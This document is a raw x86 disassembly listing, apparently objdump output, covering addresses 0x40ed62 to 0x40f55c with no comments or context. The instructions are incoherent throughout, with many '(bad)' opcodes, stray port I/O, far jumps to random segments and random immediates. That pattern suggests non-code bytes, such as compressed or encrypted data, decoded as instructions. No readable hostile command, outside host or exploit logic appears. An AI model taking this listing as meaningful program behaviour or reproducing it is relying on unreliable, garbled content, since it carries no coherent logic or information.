  40ed62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed63:	dec    ebx
  40ed64:	test   BYTE PTR [eax+edi*4-0x3d],dl
  40ed68:	dec    edx
  40ed69:	and    dl,BYTE PTR [ecx+edi*8-0x41c97577]
  40ed70:	sub    BYTE PTR ds:0x8b3078d5,bl
  40ed76:	cld    
  40ed77:	aaa    
  40ed78:	fwait
  40ed79:	pusha  
  40ed7a:	xor    eax,0x5e30d7cc
  40ed7f:	mov    al,0xc6
  40ed81:	jge    0x40edf7
  40ed83:	jbe    0x40eddc
  40ed85:	lahf   
  40ed86:	mov    ds:0x3cbbdb2e,eax
  40ed8b:	es push es
  40ed8d:	stc    
  40ed8e:	xchg   esp,eax
  40ed8f:	clc    
  40ed90:	cmp    BYTE PTR ds:0xa20ce9b6,cl
  40ed96:	push   0xfffffff2
  40ed98:	(bad)  
  40ed99:	push   edi
  40ed9a:	mov    cl,0x18
  40ed9c:	xor    al,0xa5
  40ed9e:	cdq    
  40ed9f:	pop    edi
  40eda0:	sub    eax,0x42d20762
  40eda5:	mov    ch,0xa4
  40eda7:	cwde   
  40eda8:	or     dh,BYTE PTR [edi+0x76e5460e]
  40edae:	sub    al,BYTE PTR [esi-0x18]
  40edb1:	ret    
  40edb2:	mov    al,0x5c
  40edb4:	rcl    DWORD PTR [edi+0x33],cl
  40edb7:	aaa    
  40edb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edb9:	sbb    DWORD PTR [ecx-0x47d3ed5e],esp
  40edbf:	leave  
  40edc0:	xchg   BYTE PTR [eax-0x380c8d07],bl
  40edc6:	pop    ds
  40edc7:	jle    0x40ed52
  40edc9:	pop    esi
  40edca:	mov    edi,0x907d4889
  40edcf:	fcom   QWORD PTR [eax]
  40edd1:	imul   DWORD PTR [ecx+eax*2-0x2b]
  40edd5:	ficomp DWORD PTR [edi]
  40edd7:	dec    edi
  40edd8:	stos   DWORD PTR es:[edi],eax
  40edd9:	gs push eax
  40eddb:	pop    ecx
  40eddc:	jnp    0x40edc7
  40edde:	mov    dl,0x6d
  40ede0:	jbe    0x40ed8c
  40ede2:	div    DWORD PTR [edi]
  40ede4:	push   ebx
  40ede5:	icebp  
  40ede6:	shr    BYTE PTR [edx],cl
  40ede8:	jb     0x40ed8a
  40edea:	sub    al,0xe8
  40edec:	sub    eax,0xd2a675dc
  40edf1:	mov    edi,0x9b495a14
  40edf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edf7:	aaa    
  40edf8:	jb     0x40ee74
  40edfa:	cdq    
  40edfb:	sti    
  40edfc:	inc    ecx
  40edfd:	sete   cl
  40ee00:	jp     0x40edb4
  40ee02:	daa    
  40ee03:	pop    ebx
  40ee04:	sbb    DWORD PTR [ecx],eax
  40ee06:	mov    al,ds:0x417a9ad1
  40ee0b:	jmp    0x5ba7:0x410c4213
  40ee12:	inc    ebx
  40ee13:	gs xor ecx,ebx
  40ee16:	std    
  40ee17:	sub    ebp,edx
  40ee19:	mov    cl,0x0
  40ee1b:	inc    ebx
  40ee1c:	or     ebx,edi
  40ee1e:	nop
  40ee1f:	mov    ds:0x24545028,eax
  40ee24:	js     0x40ee95
  40ee26:	fwait
  40ee27:	inc    edx
  40ee28:	jns    0x40edc7
  40ee2a:	lods   al,BYTE PTR ds:[esi]
  40ee2b:	(bad)  
  40ee2c:	pop    ebx
  40ee2d:	add    DWORD PTR [edx+eiz*4],ebx
  40ee30:	das    
  40ee31:	pop    ecx
  40ee32:	aaa    
  40ee33:	dec    esp
  40ee34:	jb     0x40edc0
  40ee36:	sbb    ch,BYTE PTR [edx]
  40ee38:	cli    
  40ee39:	ret    0xf3c8
  40ee3c:	mov    eax,ds:0x96eda398
  40ee41:	retf   0x6b30
  40ee44:	xchg   BYTE PTR [esi-0x61],bl
  40ee47:	stc    
  40ee48:	aas    
  40ee49:	mov    dh,0x1d
  40ee4b:	pop    ebp
  40ee4c:	pop    eax
  40ee4d:	jae    0x40ee56
  40ee4f:	push   es
  40ee50:	add    al,ch
  40ee52:	dec    esi
  40ee53:	add    bh,al
  40ee55:	dec    edi
  40ee56:	pop    esi
  40ee57:	fisttp DWORD PTR [edx+0x6fc378b1]
  40ee5e:	(bad)  
  40ee5f:	lahf   
  40ee60:	es xchg ebx,eax
  40ee62:	inc    eax
  40ee63:	jne    0x40ee64
  40ee65:	loope  0x40eec9
  40ee67:	dec    edx
  40ee68:	fwait
  40ee69:	push   ds
  40ee6a:	add    DWORD PTR [eax],ebx
  40ee6c:	push   es
  40ee6d:	in     eax,dx
  40ee6e:	dec    ebx
  40ee6f:	mov    ecx,0xa315ec9d
  40ee74:	int3   
  40ee75:	adc    BYTE PTR [edx-0x15],dh
  40ee78:	enter  0x1cc0,0x16
  40ee7c:	adc    DWORD PTR [eax+edi*4+0x52],ebx
  40ee80:	sbb    bl,0xd2
  40ee83:	pop    es
  40ee84:	jnp    0x40eec5
  40ee86:	cmp    al,0xdd
  40ee88:	and    ebp,DWORD PTR [edx+ebx*8]
  40ee8b:	cwde   
  40ee8c:	std    
  40ee8d:	clc    
  40ee8e:	(bad)  
  40ee8f:	gs sti 
  40ee91:	dec    ebp
  40ee92:	add    ecx,DWORD PTR [ecx-0x2676344c]
  40ee98:	xor    DWORD PTR [esi+0x2d],eax
  40ee9b:	mov    ds:0xb23f5591,al
  40eea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea1:	xchg   ebp,eax
  40eea2:	lods   eax,DWORD PTR ds:[esi]
  40eea3:	xchg   esi,eax
  40eea4:	push   esi
  40eea5:	mov    al,0x93
  40eea7:	test   DWORD PTR [edx+0x30fada77],eax
  40eead:	dec    ebp
  40eeae:	mov    ch,bl
  40eeb0:	test   DWORD PTR [edi+edi*8+0x6],esp
  40eeb4:	fdiv   DWORD PTR [esp+eiz*8+0x33]
  40eeb8:	sbb    eax,0x6576f3c0
  40eebd:	les    esi,FWORD PTR [ebx+eax*2]
  40eec0:	ins    BYTE PTR es:[edi],dx
  40eec1:	adc    al,0x14
  40eec3:	aaa    
  40eec4:	pop    es
  40eec5:	adc    ebx,DWORD PTR [ecx-0x24ecff70]
  40eecb:	mov    eax,ds:0x6cdfcbaa
  40eed0:	fwait
  40eed1:	jbe    0x40eebe
  40eed3:	scas   eax,DWORD PTR es:[edi]
  40eed4:	mov    ebp,0x43a65357
  40eed9:	mov    BYTE PTR [edi-0x2c47d250],al
  40eedf:	add    esp,DWORD PTR [esi]
  40eee1:	sbb    DWORD PTR [ecx-0x6c],0xffffff99
  40eee5:	mov    esp,0xdde4d1a0
  40eeea:	bound  ebp,QWORD PTR [esi+0x4c4029e0]
  40eef0:	lock push 0x26
  40eef3:	xor    BYTE PTR [ecx],al
  40eef5:	pop    gs
  40eef7:	aas    
  40eef8:	or     BYTE PTR [ebx-0x5285591c],0x91
  40eeff:	pop    ebp
  40ef00:	jbe    0x40ef75
  40ef02:	out    0x78,al
  40ef04:	test   eax,0x84e060fb
  40ef09:	scas   al,BYTE PTR es:[edi]
  40ef0a:	gs jp  0x40eee0
  40ef0d:	or     eax,0x85dcbcc4
  40ef12:	jnp    0x40eec1
  40ef14:	jae    0x40ef06
  40ef16:	mov    edi,0x4288300b
  40ef1b:	push   0x4b
  40ef1d:	sti    
  40ef1e:	xlat   BYTE PTR ds:[ebx]
  40ef1f:	push   esi
  40ef20:	pop    ss
  40ef21:	sbb    eax,0x1b00c981
  40ef26:	lods   al,BYTE PTR ds:[esi]
  40ef27:	xchg   BYTE PTR [esi+0x70],cl
  40ef2a:	(bad)  
  40ef2b:	inc    ebp
  40ef2c:	mov    eax,0xe239005
  40ef31:	mov    DWORD PTR [edx+0x5b],esp
  40ef34:	pushf  
  40ef35:	mov    dl,0xab
  40ef37:	or     ebp,DWORD PTR [esi+0x6a11b8a0]
  40ef3d:	push   0xfa146897
  40ef42:	mov    ebx,cs
  40ef44:	mov    dh,0xb1
  40ef46:	push   ss
  40ef47:	sub    eax,0xde89d28f
  40ef4c:	pop    esi
  40ef4d:	cmp    bl,ch
  40ef4f:	lahf   
  40ef50:	xchg   ebx,eax
  40ef51:	retf   0x3648
  40ef54:	cdq    
  40ef55:	test   eax,0x1bfdb379
  40ef5a:	xor    ebp,esi
  40ef5c:	jmp    0x40efca
  40ef5e:	dec    esi
  40ef5f:	es push cs
  40ef61:	mov    ds:0x48f2592e,eax
  40ef66:	jg     0x40ef71
  40ef68:	inc    edi
  40ef69:	je     0x40efdb
  40ef6b:	jle    0x40ef4b
  40ef6d:	push   esi
  40ef6e:	pop    edi
  40ef6f:	fsubr  DWORD PTR [edi-0x60]
  40ef72:	inc    ecx
  40ef73:	into   
  40ef74:	les    edi,FWORD PTR [edi+0x5d5f71c2]
  40ef7a:	fsubr  st,st(1)
  40ef7c:	pop    esi
  40ef7d:	mov    DWORD PTR [edi],ebx
  40ef7f:	aad    0xa3
  40ef81:	mov    bh,0xcf
  40ef83:	jle    0x40ef48
  40ef85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef86:	fs pop ss
  40ef88:	imul   esi,edi,0x58
  40ef8b:	test   DWORD PTR [ecx],esp
  40ef8d:	stos   BYTE PTR es:[edi],al
  40ef8e:	or     dl,BYTE PTR [esi-0x23]
  40ef91:	xor    al,0x82
  40ef93:	(bad)  
  40ef94:	push   ebp
  40ef95:	scas   eax,DWORD PTR es:[edi]
  40ef96:	sbb    dl,dl
  40ef98:	push   ebp
  40ef99:	in     al,dx
  40ef9a:	sub    dl,dh
  40ef9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef9d:	mov    WORD PTR [edi+0x3d],?
  40efa0:	sub    eax,0x385ef50f
  40efa5:	icebp  
  40efa6:	or     DWORD PTR [edi+edi*8-0x80],eax
  40efaa:	pop    sp
  40efac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efad:	dec    edx
  40efae:	push   edx
  40efaf:	(bad)  
  40efb1:	js     0x40f024
  40efb3:	adc    esp,DWORD PTR [edx]
  40efb5:	cmp    al,0x34
  40efb7:	mov    al,0x92
  40efb9:	cmp    dh,bh
  40efbb:	push   0xaa15c199
  40efc0:	cmc    
  40efc1:	adc    ebp,esi
  40efc3:	pop    es
  40efc4:	xchg   esp,eax
  40efc5:	aad    0xcf
  40efc7:	shr    DWORD PTR [eax],0x8b
  40efca:	repnz mov al,ds:0xddcbd24e
  40efd0:	dec    ebp
  40efd1:	pop    edi
  40efd2:	mov    esi,0xc04e9bd7
  40efd7:	pop    edx
  40efd9:	dec    esi
  40efda:	adc    al,0x28
  40efdc:	(bad)  
  40efdd:	loopne 0x40efc4
  40efdf:	shl    BYTE PTR [ebx],0xeb
  40efe2:	xor    DWORD PTR [eax-0x2c7cc105],ebp
  40efe8:	cdq    
  40efe9:	pop    esi
  40efea:	mov    BYTE PTR [ebx-0x79d218d6],bl
  40eff0:	or     eax,0x93a9f2f7
  40eff5:	inc    esi
  40eff6:	dec    eax
  40eff7:	push   edi
  40eff8:	add    BYTE PTR [ebp-0x53],ah
  40effb:	pop    es
  40effc:	or     BYTE PTR [esp+edx*1],ch
  40efff:	pushf  
  40f000:	(bad)  
  40f001:	aaa    
  40f002:	cmp    ah,al
  40f004:	cmp    esp,DWORD PTR [edi]
  40f006:	mov    ds:0x48b3be38,al
  40f00b:	repnz mov cl,0xde
  40f00e:	inc    ecx
  40f00f:	xchg   edx,eax
  40f010:	addr16 cmp eax,0xd182d811
  40f016:	and    bh,0x6e
  40f019:	jae    0x40f029
  40f01b:	jbe    0x40effa
  40f01d:	dec    ebx
  40f01e:	or     BYTE PTR [ebx+0x1659a95e],0x13
  40f025:	das    
  40f026:	ins    DWORD PTR es:[edi],dx
  40f027:	in     al,dx
  40f028:	xchg   edi,eax
  40f029:	imul   edx,DWORD PTR [esi+ebp*1],0x43
  40f02d:	icebp  
  40f02e:	cli    
  40f02f:	mov    ebx,0xc0611ae
  40f034:	mov    al,ds:0x7f28cedd
  40f039:	imul   ebp,esp,0x6f
  40f03c:	push   edx
  40f03d:	pop    ebx
  40f03e:	mov    al,0x5e
  40f040:	jno    0x40f079
  40f042:	xchg   ecx,eax
  40f043:	out    0x48,eax
  40f045:	xor    cl,BYTE PTR [esp+eax*1-0x26]
  40f049:	sbb    BYTE PTR [edi],bh
  40f04b:	xlat   BYTE PTR ds:[ebx]
  40f04c:	lods   eax,DWORD PTR ds:[esi]
  40f04d:	movq   mm5,QWORD PTR [ebp-0x2bc968dc]
  40f054:	cmp    BYTE PTR [eax-0x109ec333],al
  40f05a:	ret    0x603a
  40f05d:	(bad)  
  40f05e:	push   esp
  40f05f:	push   ebp
  40f060:	ins    DWORD PTR es:[edi],dx
  40f061:	or     DWORD PTR [edi+0x45],0x3577d7c
  40f068:	imul   esp,DWORD PTR [ebp+0x67],0x86012476
  40f06f:	jp     0x40f038
  40f071:	std    
  40f072:	inc    ecx
  40f073:	icebp  
  40f074:	sti    
  40f075:	xor    eax,0xcd71f458
  40f07a:	or     DWORD PTR [esi+0x28],ebp
  40f07d:	fcomp  DWORD PTR [eax+0x2bb5dc4c]
  40f083:	or     BYTE PTR [esp+ecx*8-0x487fe392],0x34
  40f08b:	popa   
  40f08c:	adc    BYTE PTR [esi],dh
  40f08e:	call   0x6e5ac195
  40f093:	in     eax,0xfc
  40f095:	out    dx,eax
  40f096:	jmp    0xff7d:0x71f8a7cd
  40f09d:	adc    DWORD PTR [eax],0xfffffff3
  40f0a0:	and    eax,0xcf1bcb44
  40f0a5:	call   0x318c18c2
  40f0aa:	repz (bad) 
  40f0ac:	push   ss
  40f0ad:	mov    ch,ah
  40f0af:	lea    edx,[esi+0x41aad565]
  40f0b5:	jo     0x40f102
  40f0b7:	and    eax,0xc2a9cf45
  40f0bc:	sbb    al,0x6b
  40f0be:	xor    dh,dl
  40f0c0:	repz fcomp DWORD PTR [eax-0x45]
  40f0c4:	repnz ds push 0xc0536307
  40f0cb:	popf   
  40f0cc:	aaa    
  40f0cd:	fld    st(3)
  40f0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0d0:	lock repz (bad) 
  40f0d3:	stc    
  40f0d4:	scas   eax,DWORD PTR es:[edi]
  40f0d5:	add    BYTE PTR [edx+0x6e],ah
  40f0d8:	aad    0x1b
  40f0da:	dec    edx
  40f0db:	lods   eax,DWORD PTR ds:[esi]
  40f0dc:	pusha  
  40f0dd:	push   ebp
  40f0de:	ja     0x40f0a3
  40f0e0:	fwait
  40f0e1:	jae    0x40f100
  40f0e3:	xlat   BYTE PTR ds:[ebx]
  40f0e4:	cmp    eax,ecx
  40f0e6:	ins    DWORD PTR es:[edi],dx
  40f0e7:	pop    es
  40f0e8:	push   0x8f9aaf56
  40f0ed:	(bad)  
  40f0ee:	imul   eax,ecx,0x7de45e70
  40f0f4:	add    al,0xaf
  40f0f6:	daa    
  40f0f7:	ror    dh,1
  40f0f9:	(bad)  
  40f0fa:	out    0x8f,eax
  40f0fc:	sbb    dh,BYTE PTR [edi+0x7f]
  40f0ff:	sbb    ebp,ecx
  40f101:	cdq    
  40f102:	pop    eax
  40f103:	leave  
  40f104:	mov    ebx,0x16b4bdcb
  40f109:	ficomp DWORD PTR [ecx]
  40f10b:	(bad)  
  40f10c:	retf   
  40f10d:	in     al,0xf2
  40f10f:	nop
  40f110:	(bad)  
  40f111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f112:	shl    edx,1
  40f114:	add    al,0x2b
  40f116:	jns    0x40f12e
  40f118:	dec    edi
  40f119:	sbb    dl,al
  40f11b:	dec    edx
  40f11c:	mov    ?,WORD PTR [edi-0x3a]
  40f11f:	imul   edi,DWORD PTR [esi-0x1b],0x92819d28
  40f126:	lods   al,BYTE PTR ds:[esi]
  40f127:	sub    eax,0x7d611844
  40f12c:	jns    0x40f117
  40f12e:	pop    ebx
  40f12f:	or     DWORD PTR [ebx-0x4],edx
  40f132:	mov    bh,0x3d
  40f134:	jge    0x40f127
  40f136:	mov    ds:0x8f5cc86a,al
  40f13b:	and    DWORD PTR [ebx-0x6c],edi
  40f13e:	dec    eax
  40f13f:	push   esp
  40f140:	push   eax
  40f141:	mov    edi,0xa0e072d0
  40f146:	sahf   
  40f147:	cmp    esi,DWORD PTR [eax]
  40f149:	fld    QWORD PTR [edi-0x16]
  40f14c:	addr16 lahf 
  40f14e:	and    BYTE PTR [ebx],bl
  40f150:	(bad)  
  40f151:	enter  0x2612,0x10
  40f155:	outs   dx,DWORD PTR ss:[esi]
  40f157:	loopne 0x40f1d8
  40f159:	enter  0x58f,0x18
  40f15d:	jmp    0x3531:0x95fec4c6
  40f164:	dec    edi
  40f165:	jmp    0x3c0c:0x4233bab4
  40f16c:	sahf   
  40f16d:	adc    ecx,DWORD PTR [esi]
  40f16f:	clc    
  40f170:	(bad)  
  40f171:	loope  0x40f1af
  40f173:	scas   al,BYTE PTR es:[edi]
  40f174:	adc    edx,DWORD PTR [edi+esi*2-0x654723ee]
  40f17b:	mov    ebp,0xfe2a8ef7
  40f180:	scas   eax,DWORD PTR es:[edi]
  40f181:	cdq    
  40f182:	ret    0xaa1f
  40f185:	cmp    bl,BYTE PTR [ebp-0x7c9b53f9]
  40f18b:	add    al,0xc3
  40f18d:	fnstcw WORD PTR [edi+0x167baa3d]
  40f193:	scas   eax,DWORD PTR es:[edi]
  40f194:	dec    ecx
  40f195:	dec    ebx
  40f196:	dec    esp
  40f197:	mov    ecx,0x2381c527
  40f19c:	mov    esi,0x4520ef07
  40f1a1:	pop    edx
  40f1a2:	stc    
  40f1a3:	in     eax,dx
  40f1a4:	sar    DWORD PTR [esi+0x35],1
  40f1a7:	test   al,0x5b
  40f1a9:	scas   eax,DWORD PTR es:[edi]
  40f1aa:	mov    al,ds:0xb2de49d
  40f1af:	dec    ebp
  40f1b0:	scas   al,BYTE PTR es:[edi]
  40f1b1:	in     eax,0x36
  40f1b3:	aas    
  40f1b4:	repnz mov ebx,0x2f353cbe
  40f1ba:	dec    esi
  40f1bb:	les    ecx,FWORD PTR [eax+ecx*8+0x4714087d]
  40f1c2:	mov    ?,WORD PTR [edx-0x45]
  40f1c5:	loopne 0x40f1f8
  40f1c7:	jmp    0x5b3e067f
  40f1cc:	dec    ecx
  40f1cd:	fadd   QWORD PTR [ecx-0x6374010b]
  40f1d3:	stc    
  40f1d4:	inc    edx
  40f1d5:	aas    
  40f1d6:	push   ds
  40f1d7:	pop    es
  40f1d8:	mov    ebp,0x8873b848
  40f1dd:	mov    WORD PTR [esi],fs
  40f1df:	rcl    DWORD PTR [ebp+0x7cc171bc],0x23
  40f1e6:	xchg   edx,eax
  40f1e7:	in     eax,dx
  40f1e8:	mov    edx,0xad32407c
  40f1ed:	into   
  40f1ee:	stc    
  40f1ef:	les    ebx,FWORD PTR [edi-0x4a]
  40f1f2:	adc    edi,DWORD PTR [ebp-0x3080e595]
  40f1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1f9:	dec    esp
  40f1fa:	jl     0x40f1ac
  40f1fc:	jmp    0xfc28:0x62219cce
  40f203:	daa    
  40f204:	sbb    BYTE PTR [ebp+ebp*8-0x17e50af9],0x14
  40f20c:	fwait
  40f20d:	(bad)  
  40f20e:	xchg   ebp,eax
  40f20f:	dec    ecx
  40f210:	mov    ecx,0x2be7cadb
  40f215:	add    dh,dh
  40f217:	jns    0x40f213
  40f219:	dec    ebp
  40f21a:	mov    ah,0x79
  40f21c:	mov    ds:0x3d6e4e4,eax
  40f221:	aas    
  40f222:	ja     0x40f293
  40f224:	add    DWORD PTR [esi-0x10],0x685d80a4
  40f22b:	fsub   DWORD PTR [edx+0x320dced7]
  40f231:	leave  
  40f232:	mov    ah,0x0
  40f234:	push   cs
  40f235:	xlat   BYTE PTR ds:[ebx]
  40f236:	imul   eax,DWORD PTR [ecx],0x2
  40f239:	mov    eax,0x601105ea
  40f23e:	stos   BYTE PTR es:[edi],al
  40f23f:	sti    
  40f240:	add    eax,0x66f5571c
  40f245:	push   edx
  40f246:	out    dx,eax
  40f247:	aam    0x92
  40f249:	xchg   ebx,eax
  40f24a:	add    cl,ch
  40f24c:	test   eax,0xe2be74ef
  40f251:	mov    al,0x8a
  40f253:	sub    ebx,DWORD PTR [esi*4-0x7cff05e3]
  40f25a:	cdq    
  40f25b:	or     esp,DWORD PTR [edi]
  40f25d:	iret   
  40f25e:	or     bh,dl
  40f260:	jl     0x40f1f5
  40f262:	lods   eax,DWORD PTR ds:[esi]
  40f263:	shl    DWORD PTR [edi+0x77ffd408],cl
  40f269:	mov    DWORD PTR ds:0x7c765a69,edx
  40f26f:	add    bl,BYTE PTR [edi+0x5]
  40f272:	aaa    
  40f273:	mov    ecx,ecx
  40f275:	out    0x8a,eax
  40f277:	jmp    0x114df520
  40f27c:	mov    edi,0x53ac869a
  40f281:	add    ecx,DWORD PTR [edi-0x6ef9b4a]
  40f287:	sub    BYTE PTR [ebx-0x7d4f3649],bh
  40f28d:	or     al,0xc3
  40f28f:	xchg   ebx,eax
  40f290:	xor    ebx,DWORD PTR [ebp+0x44]
  40f293:	pop    ebx
  40f294:	mov    cl,0x2f
  40f296:	arpl   WORD PTR [ebx+0x70],dx
  40f299:	adc    dl,BYTE PTR [ecx-0x4]
  40f29c:	dec    ebp
  40f29d:	fbstp  TBYTE PTR [ebx]
  40f29f:	sub    ebp,eax
  40f2a1:	ret    
  40f2a2:	lock ins DWORD PTR es:[edi],dx
  40f2a4:	repz lock mov ah,0x49
  40f2a8:	les    edi,FWORD PTR [eax+0x6c53ef9]
  40f2ae:	and    eax,0x107b516e
  40f2b3:	fdiv   QWORD PTR [ecx+0x76]
  40f2b6:	push   eax
  40f2b7:	retf   0xeb33
  40f2ba:	inc    ebx
  40f2bb:	mov    ds:0x36895cc5,eax
  40f2c0:	and    al,0xe
  40f2c2:	aas    
  40f2c3:	call   0xe29b:0x8687da9d
  40f2ca:	sbb    eax,0xb09ed43f
  40f2cf:	int    0xca
  40f2d1:	loopne 0x40f2cb
  40f2d3:	jb     0x40f2b6
  40f2d5:	(bad)  
  40f2d6:	je     0x40f2eb
  40f2d8:	xchg   ebp,eax
  40f2d9:	sbb    BYTE PTR [ebp+eax*4+0x59],dl
  40f2dd:	jmp    0x40f303
  40f2df:	les    edx,FWORD PTR [ebp-0x39570eaa]
  40f2e5:	ss (bad) 
  40f2e7:	jg     0x40f31f
  40f2e9:	and    ecx,DWORD PTR [edi-0x5e167dd5]
  40f2ef:	xor    DWORD PTR [ebp+0x37bbcc4e],ebx
  40f2f5:	xchg   ebx,eax
  40f2f6:	fcmovu st,st(2)
  40f2f8:	dec    DWORD PTR ds:0xef0bb176
  40f2fe:	rcl    DWORD PTR [eax-0x4efcaf92],1
  40f304:	xor    eax,0x19a22071
  40f309:	ret    
  40f30a:	in     al,dx
  40f30b:	gs mov edx,0x42051916
  40f311:	jge    0x40f31d
  40f313:	pop    edx
  40f314:	sbb    ebp,DWORD PTR [esi-0x2a]
  40f317:	or     DWORD PTR [edi],0xf2d0c395
  40f31d:	push   ebp
  40f31e:	or     esp,esp
  40f320:	jno    0x40f364
  40f322:	ss xor eax,0xa64797fa
  40f328:	and    BYTE PTR [eax-0x5bd8b456],cl
  40f32e:	mov    eax,0xd8f5417d
  40f333:	fstp   st(7)
  40f335:	mov    DWORD PTR [eax],esp
  40f337:	xchg   ebp,eax
  40f338:	leave  
  40f339:	cld    
  40f33a:	loop   0x40f362
  40f33c:	daa    
  40f33d:	sub    ebx,ebp
  40f33f:	cld    
  40f340:	xor    DWORD PTR ds:0x348fb8d,esi
  40f346:	loopne 0x40f382
  40f348:	out    0x51,eax
  40f34a:	mov    al,0x37
  40f34c:	cmp    al,0x2
  40f34e:	shl    BYTE PTR ds:0xbdbef132,1
  40f354:	jns    0x40f36d
  40f356:	adc    al,dl
  40f358:	in     eax,dx
  40f359:	pop    ds
  40f35a:	pop    esp
  40f35b:	adc    bl,BYTE PTR [edx]
  40f35d:	mov    edi,0x4b5f8dad
  40f362:	bound  edx,QWORD PTR ds:0x300e821
  40f368:	adc    BYTE PTR [edi-0x360674cb],bl
  40f36e:	dec    edx
  40f36f:	xlat   BYTE PTR ds:[ebx]
  40f370:	jae    0x40f3b2
  40f372:	push   0xef82afb4
  40f377:	or     BYTE PTR [ebx],bl
  40f379:	imul   esi,DWORD PTR [esi],0x43c1e059
  40f37f:	jb     0x40f318
  40f381:	jp     0x40f325
  40f383:	popf   
  40f384:	push   edx
  40f385:	and    eax,0x979ce085
  40f38a:	sub    BYTE PTR [edi-0x34],ch
  40f38d:	neg    DWORD PTR [esi-0x6a]
  40f390:	es leave 
  40f392:	repz xlat BYTE PTR ds:[ebx]
  40f394:	add    ch,BYTE PTR [ecx+ecx*4+0x5a]
  40f398:	popf   
  40f399:	test   BYTE PTR [esi],ch
  40f39b:	mov    es:0x3e73d3a8,al
  40f3a1:	cmp    bl,bl
  40f3a3:	jns    0x40f398
  40f3a5:	mov    eax,ds:0x6c788a3a
  40f3aa:	outs   dx,BYTE PTR ds:[esi]
  40f3ab:	cmp    ch,dl
  40f3ad:	das    
  40f3ae:	xor    DWORD PTR [eax-0x6f],esi
  40f3b1:	sbb    ch,dh
  40f3b3:	dec    ebx
  40f3b4:	aad    0xe3
  40f3b6:	xchg   edi,eax
  40f3b7:	add    ebx,DWORD PTR [ecx-0x67]
  40f3ba:	sar    DWORD PTR [eax],1
  40f3bc:	dec    edi
  40f3bd:	popa   
  40f3be:	loopne 0x40f3b5
  40f3c0:	xor    al,0xc9
  40f3c2:	scas   eax,DWORD PTR es:[edi]
  40f3c3:	clc    
  40f3c4:	mov    dh,bh
  40f3c6:	scas   eax,DWORD PTR es:[edi]
  40f3c7:	jae    0x40f371
  40f3c9:	fcom   DWORD PTR [eax+0x1c]
  40f3cc:	jns    0x40f403
  40f3ce:	test   DWORD PTR [edi-0x72],esp
  40f3d1:	and    edx,eax
  40f3d3:	push   ecx
  40f3d4:	push   ss
  40f3d5:	jmp    DWORD PTR [ecx-0x24]
  40f3d8:	cmp    BYTE PTR [ecx-0x28],ah
  40f3db:	adc    BYTE PTR [esi+0x12],0xdd
  40f3df:	call   0xc120:0x411e96a4
  40f3e6:	shl    DWORD PTR [eax-0x1d],0x75
  40f3ea:	sub    ebx,edx
  40f3ec:	enter  0xce97,0x59
  40f3f0:	push   0xdbdecf5a
  40f3f5:	xor    DWORD PTR [edi+0x40],0xa276a23
  40f3fc:	or     cl,BYTE PTR [ebx-0x102b90ad]
  40f402:	adc    al,0xe9
  40f404:	push   edi
  40f405:	sar    BYTE PTR [ecx*8+0x7dbdc173],0xe6
  40f40d:	fwait
  40f40e:	and    DWORD PTR [esi-0xda151d7],edx
  40f414:	stos   DWORD PTR es:[edi],eax
  40f415:	gs ds clc 
  40f418:	sub    ah,BYTE PTR [edx]
  40f41a:	in     al,dx
  40f41b:	icebp  
  40f41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f41d:	xchg   edx,eax
  40f41e:	dec    ecx
  40f41f:	into   
  40f420:	mov    al,BYTE PTR [eax-0x66359221]
  40f426:	sub    dl,bl
  40f428:	inc    ecx
  40f429:	jle    0x40f3dd
  40f42b:	repnz sub esi,0xa06b7414
  40f432:	in     al,0x47
  40f434:	add    ah,dl
  40f436:	sti    
  40f437:	adc    eax,0x9ae3e279
  40f43c:	aas    
  40f43d:	pop    esp
  40f43e:	dec    eax
  40f43f:	jns    0x40f406
  40f441:	pop    ds
  40f442:	push   ss
  40f443:	test   eax,0xd672cbaa
  40f448:	and    edx,ecx
  40f44a:	dec    esi
  40f44b:	xor    dh,BYTE PTR [esi+eax*8-0x6c33cb1]
  40f452:	push   0x9cad046f
  40f457:	in     al,0xe0
  40f459:	cmp    eax,0xf29a518d
  40f45e:	fiadd  DWORD PTR [eax-0x73b5f932]
  40f464:	enter  0x7981,0xdb
  40f468:	call   0x5bfa:0x65fc0709
  40f46f:	mov    ah,0xcf
  40f471:	xchg   esi,eax
  40f472:	xlat   BYTE PTR ds:[ebx]
  40f473:	ins    DWORD PTR es:[edi],dx
  40f474:	arpl   WORD PTR [ebp+0x60184fd6],di
  40f47a:	stc    
  40f47b:	out    0x61,eax
  40f47d:	bound  edx,QWORD PTR [edx]
  40f47f:	mov    esp,0x1deb8bec
  40f484:	hlt    
  40f485:	mov    cl,0x36
  40f487:	dec    ebp
  40f488:	enter  0x8bca,0x74
  40f48c:	xor    edi,DWORD PTR [esi]
  40f48e:	jmp    0xd39b:0xb2b7ea86
  40f495:	or     cl,dl
	...
  40f513:	add    ah,dh
  40f515:	test   BYTE PTR [eax-0x6b],cl
  40f518:	js     0x40f4f7
  40f51a:	std    
  40f51b:	in     eax,0xbe
  40f51d:	mov    bh,0x36
  40f51f:	ds and al,0xc
  40f522:	xchg   ecx,eax
  40f523:	fadd   QWORD PTR [ecx+0x6b0000a1]
  40f529:	pop    es
  40f52a:	add    BYTE PTR [eax],al
  40f52c:	sar    BYTE PTR [ebp*1-0x3f3f159f],cl
  40f533:	sbb    esp,DWORD PTR [ebp-0x7f]
  40f536:	dec    esi
  40f537:	popa   
  40f538:	adc    eax,DWORD PTR [eax+esi*1+0x3c]
  40f53c:	aam    0x57
  40f53e:	les    ebp,FWORD PTR [ecx+ebp*1-0x10b4f0a7]
  40f545:	rcl    BYTE PTR [edi-0x2cfd87df],0x28
  40f54c:	les    edi,FWORD PTR [eax]
  40f54e:	inc    esi
  40f54f:	loopne 0x40f4de
  40f551:	aam    0x29
  40f553:	pushf  
  40f554:	mov    esi,0x57cdb91
  40f559:	or     cl,ah
  40f55b:	pop    ebp
  40f55c:	pusha  
